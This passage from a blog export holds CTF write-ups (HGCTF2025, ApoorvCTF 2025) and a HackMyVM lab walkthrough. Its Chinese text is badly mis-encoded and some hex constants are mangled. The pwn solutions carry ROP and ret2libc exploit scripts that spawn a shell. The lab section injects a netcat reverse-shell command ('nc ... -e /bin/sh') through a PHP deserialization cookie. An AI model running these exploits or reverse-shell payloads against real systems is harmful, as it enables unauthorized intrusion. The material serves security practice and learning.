lfsr2 = è¸©è¸©èƒŒ(n, seed, mask, lfsr1) print(f\"mask = {mask}\") print(f\"output = {sum(lfsr2() \u003c\u003c (n - 1 - i) for i in range(n))}\") print(f\"enc = {AES.new(key=md5(str(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, 16))}\") ä¸€ä¸ªæŠ½è±¡çš„lfsrï¼Œlfsr1\u0026lfsr2ç”Ÿæˆæ—¶ç”¨çš„ç§å­ä»€ä¹ˆçš„éƒ½ä¸€æ ·ï¼Œåªä¸è¿‡lfsr2éœ€è¦ä¾èµ–å‰è€…å»åˆ¤æ–­æ˜¯å¦è¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿè¿™ä¸ªçŠ¶æ€å»ç”Ÿæˆæµ å½“lsfr1çš„è¾“å‡ºæ˜¯1çš„æ—¶å€™ï¼Œå°±æ›´æ–°lsfr2çš„çŠ¶æ€ å½“lsfr1çš„è¾“å‡ºæ˜¯0çš„æ—¶å€™ï¼Œå°±ç›´æ¥æ‹¿lsfr2çš„çŠ¶æ€çš„æœ€åä¸€ä½ æˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è¿™ä¸ªå»çŒœæµ‹lfsr2çš„ç¬¬kä½å¯èƒ½æ¥è‡ªlfsr1çš„ç¬¬iä½ï¼Œæˆ‘ä»¬å°±å¯ä»¥çŒœæµ‹åˆ°lfsr2çš„ä¸‹ä¸€ä½çš„å¤šç§æƒ…å†µ æ‰€ä»¥æˆ‘ä»¬ä»…éœ€å‰ªæå»æœç´¢å‡ºlfsr1 çš„64ä½å³å¯æ¢å¤seed exp from Crypto.Util.number import * from Crypto.Cipher import AES from hashlib import md5 from tqdm import tqdm import sys mask = 9494051593829874780 output = 13799267741689921474 lsfr2 = bin(output)[2:].zfill(64) enc = t_L = block_matrix(Zmod(2), [[Matrix(ZZ, 63, 1).augment(identity_matrix(63))], [Matrix(ZZ, 1, 64, [int(i) for i in bin(mask)[2::].zfill(64)])]]) L = [] for i in range(1, 64 + 1): L.append((t_L ^ i)[-1]) L = Matrix(Zmod(2), 64, 64, L) def find(lsfr1, k): #åˆå§‹åŒ– length = len(lsfr1) #å‰ªæ if length \u003c 64 and lsfr1[k] != lsfr2[length] and lsfr1[k + 1] != lsfr2[length]: return #æœç´¢å’Œæ›´æ·±å±‚æ¬¡é€’å½’ if length == 64: B = [] for i in range(1, length + 1): B.append(int(lsfr1[i - 1])) seed = L.solve_right(Matrix(Zmod(2), 64, 1, B)) seed = int(''.join([str(i[0]) for i in seed]), 2) flag = AES.new(key=md5(str(seed).encode()).digest(), mode=AES.MODE_ECB).decrypt(enc) if flag.isascii(): print(flag) sys.exit() elif length \u003c 64: if lsfr1[k] == lsfr2[length]: find(lsfr1 + '0', k) if lsfr1[k + 1] == lsfr2[length]: find(lsfr1 + '1', k + 1) if lsfr1[k] != lsfr2[length] and lsfr1[k + 1] == lsfr2[length]: find(lsfr1 + '1', k + 1) find('01', 0) ","date":"2025-03-09","objectID":"/hgctf2025/:2:9","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"sin task from Crypto.Util.number import bytes_to_long; print((2 * sin((m := bytes_to_long(b'NSSCTF{test_flag}'))) - 2 * sin(m) * cos(2 * m)).n(1024)) ''' mçš„å€¼å³ä¸ºflag 0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412 ''' ç¬¬ä¸€çœ¼çœ‹ä¸Šå»çš„æ€è·¯æ˜¯åŒ–ç®€è¿™ä¸ªå¼å­ï¼Œç„¶åarcsinï¼Œçªç„¶æƒ³èµ·æ¥è¿™ç©æ„ç›¸å½“äºå–æ¨¡äº†, $$ m-2k\\pi =c $$ butè¿™æ ·å†™ä¼šæœ‰è¯¯å·®ï¼Œæ¯•ç«Ÿä½ å¼€æ–¹ä»€ä¹ˆçš„ä¹±ä¸ƒå…«ç³Ÿçš„æ“ä½œï¼Œä¼šäº§ç”Ÿè¯¯å·®å¾ˆåˆç†å§ï¼Œå³ $$ m-2k\\pi =c+a $$ å“ï¼Ÿè¿™å°±å¾ˆæ ¼äº† exp è®°å¾—é…å¹³ from Crypto.Util.number import * c = R.\u003cx\u003e = PolynomialRing(QQ) f = x^3-(c/4) res = f.roots() c = abs(arcsin(res[0][0])) K = 2^900 T = 2^300 ge = [[1,0,K],[0,T,c*K],[0,0,2*pi.n(1024)*K]] Ge = Matrix(QQ,ge) L = Ge.LLL() print(L) assert abs(L[0][1]) == T m = long_to_bytes(int(abs(L[0][0]))) if b\"NSSCTF{\" in m: print(m) ","date":"2025-03-09","objectID":"/hgctf2025/:2:10","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"pwné¢˜ç›® ","date":"2025-03-09","objectID":"/hgctf2025/:3:0","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"hello world æœ‰pieæ— canaryå¹¶ä¸”æœ‰æº¢å‡ºï¼Œ partial writeè¿”å›åœ°å€ç§’äº† exp from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" payload = b\"a\" * 028 + p8(0C5) s(payload) ia() ","date":"2025-03-09","objectID":"/hgctf2025/:3:1","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"ret2libc1 å…ˆåˆ·é’±ï¼Œåˆ·å®Œé’±å¯ä»¥æ¥è§¦åˆ°æº¢å‡ºå‡½æ•°ï¼Œæº¢å‡ºä¸¤æ¬¡æ³„éœ²+åˆ©ç”¨ exp from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" sl(b\"3\") ru(b\"How much do you want to spend buying the hell_money?\\n\") sl(str(1000)) r() sl(b\"7\") r() sl(b\"10000\") ru(b\"6.check youer money\\n\") sl(b\"5\") ru(b\"You can name it!!!\\n\") prdi = 00000000000400D73 payload = ( b\"a\" * 048 + p(prdi) + p(elf.got[\"puts\"]) + p(elf.plt[\"puts\"]) + p(elf.sym[\"main\"]) ) s(payload) base = u(r(6).ljust(8, b\"\\0\")) - 0000000000006F6A0 success(hex(base)) system = base + libc.sym[\"system\"] binsh = base + 0000000000018CE57 payload = b\"a\" * (048) + p(00000000000400579) + p(prdi) + p(binsh) + p(system) sl(b\"5\") s(payload) ia() ","date":"2025-03-09","objectID":"/hgctf2025/:3:2","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"ret2libc2 å‘ç°ç¨‹åºæœ‰fmtæ¼æ´ï¼Œæº¢å‡ºè¿”å›åˆ°printfå¤„æ³„éœ²æ ˆä¸Šlibcï¼Œç„¶åå¾€bssä¸Šå†™ropé“¾æœ€åè·³è¿‡å» exp from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" ru(b\"hello world!\\n\") ret = 0000000000040101A payload = ( b\"|%3$p.\".ljust(030, b\"a\") + p(00000000000404060 + 0900) + p(00000000000401227) ) ps() s(payload) ru(b\"|\") base = int(r(len(b\"07f8b4ff547e2\")), 16) - 01147E2 success(hex(base)) ru(b\"show your magic\\n\") # s(p(0EBC85 + base)) payload = ( b\"a\" * (030) + p(00000000000404060 - 0100 - 0238) + p(ret) + p(base + 0000000000002A3E5) + p(base + 000000000001D8678) + p(base + 0000000000050D70) ) s(payload) ia() ","date":"2025-03-09","objectID":"/hgctf2025/:3:3","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"çœŸä¼šå¸ƒç½®æ ˆå— å¾ˆçŸ­å°çš„ç¨‹åºï¼Œç¨‹åºç»™äº†ä¸€äº›gadgetå’Œæ ˆåœ°å€ï¼Œé€šè¿‡0x401017 å¤„çš„popç¾¤å¯ä»¥æ§åˆ¶ä¸¤ä¸ªç›´æ¥éœ€è¦çš„å¯„å­˜ å™¨ï¼ˆr13å’Œr15ä¹Ÿè¦ç”¨ï¼Œä½†æ˜¯æ˜¯é—´æ¥çš„ï¼‰ï¼Œpopså®Œåè·³åˆ°0x401021 æ¸…é›¶rdxï¼Œæœ€åè·³åˆ°0x40100C å°†r13 çš„å€¼èµ‹å€¼ç»™raxï¼Œç„¶åsyscall å…¶å®ä¸€å¼€å§‹æƒ³åˆ°çš„æ˜¯æ‰“sropï¼Œä½†æ˜¯æœ¬åœ°sropæ­»æ´»è·‘ä¸é€šï¼Œæ— å¥ˆåªèƒ½æ¢æ€è·¯ exp from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" ru(b\"\\x29\\x0a\") stack = u(r(6).ljust(8, b\"\\0\")) success(hex(stack)) ret = 00000000000401013 ps() payload = ( p(ret) + p(00000000000401019) # pop 3 trash + p(0) + b\"/bin/sh\\0\" + p(00000000000401017) # pops + p(0) # rsi + p(stack) # rdi + p(0) # rbx + p(03B) # r13 + p(ret) # r15 + p(0000000000401021) # xor rdx, rdx + p(000000000040100C) # xchg rax, 03bh + p(00000000000401077) # syscall ) s(payload) ia() ","date":"2025-03-09","objectID":"/hgctf2025/:3:4","tags":["crypto"],"title":"Hgctf2025","uri":"/hgctf2025/"},{"categories":["CTF"],"content":"å‰è¨€ èµ›æ—¶å°±åšäº†ä¸¤é¢˜ï¼Œè·Ÿç€ä½¬çš„wpå¤ç°ä¸€ä¸‹ ","date":"2025-03-09","objectID":"/apoorvctf_2025/:1:0","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-03-09","objectID":"/apoorvctf_2025/:2:0","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["CTF"],"content":"Genjutsu_Labyrinth task from sympy import primerange import random from collections import deque def generate(size): grid = [[random.randint(0, 9) for col in range(size)] for row in range(size)] grid[0][0] = 0 return grid def encrypt(n, a, b, mod=101): return (a * n + b) % mod def build_encrypted_grid(grid, a, b, mod=101): size = 10 encry_grid = [] for y in range(size): row = [] for x in range(size): enc_val = encrypt(grid[y][x], a, b, mod) row.append(str(enc_val).zfill(2)) encry_grid.append(row) return encry_grid def optimize(grid): #hidden pass grid = generate(10) a = random.choice(list(primerange(2, 12))) b = random.choice(range(101)) encry_grid = build_encrypted_grid(grid, a, b, mod=101) #nc chals1.apoorvctf.xyz 4002 generateæ˜¯æ­£å¸¸ä¸€ä¸ª10*10çš„è¿·å®«ï¼Œæ¯ä¸ªæ•°å­—0-9ï¼Œèµ·ç‚¹æ˜¯0 encryptæ˜¯æ­£å¸¸çš„çº¿æ€§åŒä½™åŠ å¯† optimizeæ²¡å•¥ç”¨ build_encrypted_gridæ˜¯ç”Ÿæˆä¸€ä¸ªæ²¡ä¸ªæ•°åŠ å¯†åçš„çŸ©é˜µï¼Œå¹¶ä¸”è¾“å‡ºä¸ºå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚5-\u003e05 a=[2,3,5,7,11] //ncæƒ…å†µ ____ _ _ / ___| ___ _ __ (_) _ _ | |_ ___ _ _ | | _ / _ \\| '_ \\ | || | | || __|/ __|| | | | | |_| || __/| | | | | || |_| || |_ \\__ \\| |_| | \\____| \\___||_| |_| _/ | \\__,_| \\__||___/ \\__,_| |__/ Welcome to Genjutsu Labyrinth! Your goal is to navigate from the top-left to the bottom-right successfully Note: Your current position is denoted by Pa. The first cell has a value 0 ------------------------------------------------- Pa 49 42 42 00 00 21 00 21 00 49 00 42 21 28 56 07 00 42 56 21 28 42 42 14 21 21 21 00 14 07 49 07 35 07 07 42 56 35 07 63 28 28 07 00 49 00 56 21 28 07 56 07 35 14 42 21 35 35 00 14 21 00 07 21 35 49 07 14 28 21 35 07 00 49 14 21 00 42 42 42 21 56 28 49 56 07 14 49 28 63 07 49 35 07 07 07 28 63 00 Use S/D to move down or right. Type 'exit' to quit. Enter move (S/D): å“ï¼Œå…¶å®æˆ‘ä»¬è¦æ‰¾çš„æ˜¯xorä¸º0ï¼Œå³ä» enc_val ä¸­ç©·ä¸¾ a, b çš„å€¼ã€‚ç„¶åæ ¹æ® a, b çš„å€¼æ±‚å‡º grid çš„å€¼ï¼Œè¿›è¡Œç©·ä¸¾è·¯å¾„ï¼Œæ‰¾åˆ° XOR å€¼ä¸º 0 çš„è·¯å¾„ã€‚ exp from pwn import * import itertools from Crypto.Util.number import inverse p = remote('chals1.apoorvctf.xyz', 4002) for _ in range(12): data = p.recvuntil(b'\\n').strip().decode() print(data) # è¯»å–åŠ å¯†ç½‘æ ¼ï¼Œæ¯è¡Œæ¥æ”¶åæ›¿æ¢'Pa'ä¸º'00'ï¼Œå¹¶è½¬æ¢æˆæ•°å­—åˆ—è¡¨ encry_grid = [] for _ in range(10): data = p.recvuntil(b'\\n').strip().decode() print(data) data = data.replace('Pa', '00') row = list(map(int, data.split())) encry_grid.append(row) encs = [] for i in range(10): for j in range(10): if encry_grid[i][j] not in encs: encs.append(encry_grid[i][j]) found = False for a in [2, 3, 5, 7, 11]: for b in range(101): success = True for i in range(10): c = (a * i + b) % 101 if c not in encs: success = False break if success: found = True break if found: break grid = [] for i in range(10): row = [] for j in range(10): r = (encry_grid[i][j] - b) * inverse(a, 101) % 101 row.append(r) grid.append(row) # æ„é€ ç§»åŠ¨æŒ‡ä»¤ï¼šæ€»å…±éœ€è¦18æ­¥ï¼Œé€‰å–9æ­¥å‘ä¸‹ï¼ˆSï¼‰ç§»åŠ¨ï¼Œå…¶ä½™ä¸ºå‘å³ï¼ˆDï¼‰ç§»åŠ¨ï¼Œ # åˆ©ç”¨æ’åˆ—æšä¸¾æ‰€æœ‰å¯èƒ½çš„è·¯å¾„ï¼Œé€‰æ‹© XOR ç»“æœä¸º 0 çš„è·¯å¾„ seq = list(range(18)) for perm in itertools.permutations(seq, 9): com = '' val = 0 x = 0 y = 0 for i in range(18): if i in perm: com += 'S' x += 1 val ^= grid[x][y] else: com += 'D' y += 1 val ^= grid[x][y] if val == 0: break for i in range(18): data = p.recvuntil(b': ') print(data.decode() + com[i]) p.sendline(com[i].encode()) data = p.recvuntil(b'\\n').strip().decode() print(data) data = p.recvuntil(b'exit!\\n').strip().decode() print(data) for _ in range(2): data = p.recvuntil(b'\\n').strip().decode() print(data) p.interactive() ","date":"2025-03-09","objectID":"/apoorvctf_2025/:2:1","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["CTF"],"content":"Split_Lies ä¸¤ä¸ªç…§ç‰‡ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæœ‰ç‚¹æŠ½è±¡ å°è¯•äº†å¾ˆå¤šæ–¹æ³•åï¼Œå°† RGB çš„å€¼ç›¸åŠ åé™¤ä»¥ 256 çš„ä½™æ•°ï¼Œä¸­å¤®å‡ºç°äº†æ——å¸œã€‚ from PIL import Image img1 = Image.open('part1.png').convert('RGB') img2 = Image.open('part2.png').convert('RGB') w, h = img1.size output_img = Image.new('RGB', (w, h), (255, 255, 255)) for y in range(h): for x in range(w): r1, g1, b1 = img1.getpixel((x, y)) r2, g2, b2 = img2.getpixel((x, y)) r = (r1 + r2) % 256 g = (g1 + g2) % 256 b = (b1 + b2) % 256 output_img.putpixel((x, y), (r, g, b)) output_img.save('flag.png') ","date":"2025-03-09","objectID":"/apoorvctf_2025/:2:2","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["CTF"],"content":"Finding_Goku task import hashlib def check_hex_data(hex1, hex2, start_string): if hex1 == hex2: return \"Error: Even a Saiyan warrior knows that true strength lies in difference! The two inputs must not be identical.\" try: data1 = bytes.fromhex(hex1) data2 = bytes.fromhex(hex2) except ValueError: return \"Error: Looks like you misfired a Ki blast! Invalid hex input detected.\" start_bytes = start_string.encode() if not (data1.startswith(start_bytes) and data2.startswith(start_bytes)): return \"Error: These aren't true warriors! Both inputs must start with the legendary sign of 'GOKU' to proceed.\" def md5_hash(data): hasher = hashlib.md5() hasher.update(data) return hasher.hexdigest() hash1 = md5_hash(data1) hash2 = md5_hash(data2) if hash1 != hash2: return \"Error: These warriors are impostors! They wear the same armor but their Ki signatures (MD5 hashes) don't match.\" try: with open(\"flag.txt\", \"r\") as flag_file: flag = flag_file.read().strip() return f\"ğŸ”¥ You have found the real Goku! Your flag is: {flag}\" except FileNotFoundError: return \"Error: The Dragon Balls couldn't summon the flag! 'flag.txt' is missing.\" if __name__ == \"__main__\": start_string = \"GOKU\" hex1 = input(\"Enter first hex data: \") hex2 = input(\"Enter second hex data: \") print(check_hex_data(hex1, hex2, start_string)) æ€»è€Œè¨€ä¹‹è¨€è€Œæ€»ä¹‹æƒ³è®©md5ç›¸ç­‰ï¼Œç›´æ¥å¼€çˆ† from pwn import * p = remote('chals1.apoorvctf.xyz', 5002) with open('md5_data1', 'rb') as f: data1 = f.read().hex() with open('md5_data2', 'rb') as f: data2 = f.read().hex() data = p.recvuntil(b': ') print(data.decode() + data1) p.sendline(data1.encode()) data = p.recvuntil(b': ') print(data.decode() + data2) p.sendline(data2.encode()) data = p.recvuntil(b'\\n').rstrip() print(data.decode()) p.interactive() ","date":"2025-03-09","objectID":"/apoorvctf_2025/:2:3","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["CTF"],"content":"Kowareta_Cipher task import sys from Crypto.Cipher import AES from Crypto.Util.Padding import pad from random import randbytes def main(): key = randbytes(16) cipher = AES.new(key, AES.MODE_ECB) flag = b'apoorvctf{fake_flag_123}' print(\"Welcome to the ECB Oracle challenge!\") print(\"Enter your input in hex format.\") try: while True: print(\"Enter your input: \", end=\"\", flush=True) userinput = sys.stdin.readline().strip() if not userinput: break try: userinput = bytes.fromhex(userinput) ciphertext = cipher.encrypt(pad(userinput + flag + userinput, 16)) print(\"Ciphertext:\", ciphertext.hex()) except Exception as e: print(f\"Error: {str(e)}\") except KeyboardInterrupt: print(\"Server shutting down.\") if __name__ == \"__main__\": main() # nc chals1.apoorvctf.xyz 4001 å¾ˆæœ‰æ„æ€ï¼ŒåŠ å¯†æ ¼å¼å˜æˆx+flag+xï¼Œæˆ‘ä»¬ECBçš„ç‰¹ç‚¹å°±æ˜¯ç›¸åŒçš„æ˜æ–‡å—ä¼šç”Ÿæˆç›¸åŒçš„å¯†æ–‡å—ï¼Œpaddingæ€ä¹ˆåŠå‘¢ï¼Ÿæ¶ˆé™¤å½±å“å°±å¥½äº† exp from pwn import * p = remote('chals1.apoorvctf.xyz', 4001) for _ in range(2): data = p.recvuntil(b'\\n').strip().decode() print(data) flag = '' for i in range(32): for code in range(33, 127): inp = 'X' * (31 - i) + flag + chr(code) + 'X' * (31 - i) print('[+] input:', inp) inp_hex = inp.encode().hex() prompt = p.recvuntil(b': ').decode() print(prompt + inp_hex) p.sendline(inp_hex.encode()) data = p.recvuntil(b'\\n').strip().decode() print(data) ct = data.split(' ')[-1] if ct[32:64] == ct[96:128]: flag += chr(code) break print('[*] flag:', flag) p.interactive() ","date":"2025-03-09","objectID":"/apoorvctf_2025/:2:4","tags":["crypto"],"title":"ApoorvCTF 2025","uri":"/apoorvctf_2025/"},{"categories":["é¶åœº"],"content":"JO2024 ","date":"2025-03-07","objectID":"/hmv_jo2024/:1:0","tags":["æ¸—é€"],"title":"HMV JO2024","uri":"/hmv_jo2024/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=JO2024 ","date":"2025-03-07","objectID":"/hmv_jo2024/:1:1","tags":["æ¸—é€"],"title":"HMV JO2024","uri":"/hmv_jo2024/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~] â””â”€$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:1c:42:fd:ba:b5, IPv4: 192.168.31.187 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.106 08:00:27:91:df:4a (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.210 f4:6d:3f:27:e6:fb (Unknown) 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.841 seconds (139.05 hosts/sec). 4 responded â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~] â””â”€$ nmap -sC -sV 192.168.31.106 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 16:22 CST Nmap scan report for 192.168.31.106 Host is up (0.0039s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) | ssh-hostkey: | 256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA) |_ 256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519) 80/tcp open http Apache httpd 2.4.61 ((Debian)) |_http-title: Paris 2024 Olympic Games |_http-server-header: Apache/2.4.61 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds ç½‘é¡µæ²¡æœ‰ä»€ä¹ˆå±é™©ä¿¡æ¯ï¼Œè½»å¾®çˆ†ç ´ä¸€ä¸‹ç›®å½• â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~] â””â”€$ dirb http://192.168.31.106 / ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Fri Mar 7 16:26:54 2025 URL_BASE: http://192.168.31.106 / WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.31.106 / ---- ==\u003e DIRECTORY: http://192.168.31.106 /img/ + http://192.168.31.106 /index.php (CODE:200|SIZE:7812) + http://192.168.31.106 /server-status (CODE:403|SIZE:280) ---- Entering directory: http://192.168.31.106 /img/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ----------------- END_TIME: Fri Mar 7 16:26:58 2025 DOWNLOADED: 4612 - FOUND: 2 /imgç›®å½•ä¸çŸ¥é“å¹²å•¥çš„ï¼Œçœ‹çœ‹ï¼Œå°±æ˜¯ä¸ªæ”¾ç…§ç‰‡çš„ï¼Œæ·±åº¦æ‰«æä¸€ä¸‹ â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~] â””â”€$ dirsearch -u \"http://192.168.31.106 /\" -x 403 -e php,zip,txt /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, zip, txt | HTTP method: GET | Threads: 25 Wordlist size: 10439 Output File: /home/parallels/reports/http_192.168.31.106 /__25-03-07_16-29-03.txt Target: http://192.168.31.106 / [16:29:03] Starting: [16:29:11] 301 - 316B - /img -\u003e http://192.168.31.106 /img/ Task Completed è¿˜æ˜¯è¿™æ ·ï¼Œæˆ‘è¿˜æœ‰ä¸€è®¡ â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~] â””â”€$ gobuster dir -u 192.168.31.106 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.31.106 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 280] /index.php (Status: 200) [Size: 7812] /img (Status: 301) [Size: 316] [--\u003e http://192.168.31.106 /img/] /preferences.php (Status: 200) [Size: 3163] /.php (Status: 403) [Size: 280] å“ï¼Œ/preferenc","date":"2025-03-07","objectID":"/hmv_jo2024/:1:2","tags":["æ¸—é€"],"title":"HMV JO2024","uri":"/hmv_jo2024/"},{"categories":["é¶åœº"],"content":"å¼¹shell GET /preferences.php HTTP/1.1 Host: 192.168.31.106 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Cookie: preferences=TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjI6ImZyIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQ%3D%3D Upgrade-Insecure-Requests: 1 cookieé‡Œé¢æœ‰preferences,è¿™ç©æ„å…¶å®æ˜¯base64ï¼Œæ²¡æƒ³åˆ°å§ O:15:\"UserPreferences\":2:{s:8:\"language\";s:2:\"fr\";s:15:\"backgroundColor\";s:4:\"#ddd\";} çœ‹ç€åƒæ˜¯åºåˆ—åŒ–çš„ä¸œè¥¿ï¼Œä¸ç¡®å®šï¼Œå†è¯•è¯•ï¼Œä¿®æ”¹æˆO:15:\"UserPreferences\":2:{s:8:\"language\";s:6:\"whoami\";s:15:\"backgroundColor\";s:7:\"#DC143C\";}ç„¶åbase64å‘è¿‡å»ï¼Œä¼šå¾—åˆ°Your language setting is whoami. okï¼Œæ— æ•Œäº† O:15:\"UserPreferences\":2:{s:8:\"language\";s:33:\"nc 192.168.31.187 1234 -e /bin/sh\";s:15:\"backgroundColor\";s:4:\"#ddd\";} (æ³¨æ„ç‚¹ï¼šsï¼šåé¢çš„æ•°å­—æ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦,echo -n â€œnc 192.168.31.187 1234 -e /bin/shâ€ | wc -cæ˜¯è¾“å‡º33) è¿™ä¸ªæ—¶å€™å°±åå¼¹shellæˆåŠŸäº† ","date":"2025-03-07","objectID":"/hmv_jo2024/:1:3","tags":["æ¸—é€"],"title":"HMV JO2024","uri":"/hmv_jo2024/"},{"categories":["é¶åœº"],"content":"ææƒ å…ˆpython3 -c 'import pty; pty.spawn(\"/bin/bash\")'å‡çº§ä¸€ä¸‹shell www-data@MiWiFi-R4CM-srv:/home/vanity$ ls -la ls -la total 76 drwxr-xr-x 10 vanity vanity 4096 Mar 7 12:44 . drwxr-xr-x 3 root root 4096 Jul 28 2024 .. -rw------- 1 vanity vanity 218 Mar 7 12:43 .Xauthority lrwxrwxrwx 1 root root 9 Jul 26 2024 .bash_history -\u003e /dev/null -rw-r--r-- 1 vanity vanity 220 Jul 29 2024 .bash_logout -rw-r--r-- 1 vanity vanity 3526 Jul 29 2024 .bashrc drwxr-xr-x 7 vanity vanity 4096 Jul 29 2024 .cache drwx------ 13 vanity vanity 4096 Jul 29 2024 .config -rw-r--r-- 1 vanity vanity 35 Jul 29 2024 .dmrc -rw------- 1 vanity vanity 36 Jul 29 2024 .lesshst drwxr-xr-x 3 vanity vanity 4096 Jul 29 2024 .local -rw-r--r-- 1 vanity vanity 807 Jul 29 2024 .profile drwx------ 2 vanity vanity 4096 Jul 29 2024 .ssh -rw-r--r-- 1 vanity vanity 8 Jul 29 2024 .xprofile drwxr-xr-x 2 vanity vanity 4096 Jul 29 2024 Desktop drwxr-xr-x 2 vanity vanity 4096 Jul 29 2024 Documents drwxr-xr-x 2 vanity vanity 4096 Jul 29 2024 Images -rwxr-xr-x 1 vanity vanity 557 Jul 29 2024 backup drwx------ 2 vanity vanity 4096 Jul 29 2024 creds -rwx------ 1 vanity vanity 33 Jul 29 2024 user.txt flagä¸è®©è¯»wcï¼Œbackupå¯ä»¥ï¼Œçœ‹çœ‹ www-data@MiWiFi-R4CM-srv:/home/vanity$ cat backup cat backup #!/bin/bash SRC=\"/home/vanity\" DEST=\"/backup\" rm -rf /backup/{*,.*} echo \"Starting copy...\" find \"$SRC\" -maxdepth 1 -type f ! -name user.txt | while read srcfile; do destfile=\"$DEST${srcfile#$SRC}\" mkdir -p \"$(dirname \"$destfile\")\" dd if=\"$srcfile\" of=\"$destfile\" bs=4M md5src=$(md5sum \"$srcfile\" | cut -d ' ' -f1) md5dest=$(md5sum \"$destfile\" | cut -d ' ' -f1) if [[ \"$md5src\" != \"$md5dest\" ]]; then echo \"MD5 mismatch for $srcfile :(\" fi chmod 700 \"$destfile\" done echo \"Copy complete. All files verified !\" è¿™ä¸ªè„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯ï¼š æ¸…ç©ºç›®æ ‡ç›®å½• /backupã€‚ å°† /home/vanity ç›®å½•ä¸­é™¤äº† user.txt ä¹‹å¤–çš„æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ° /backupã€‚ 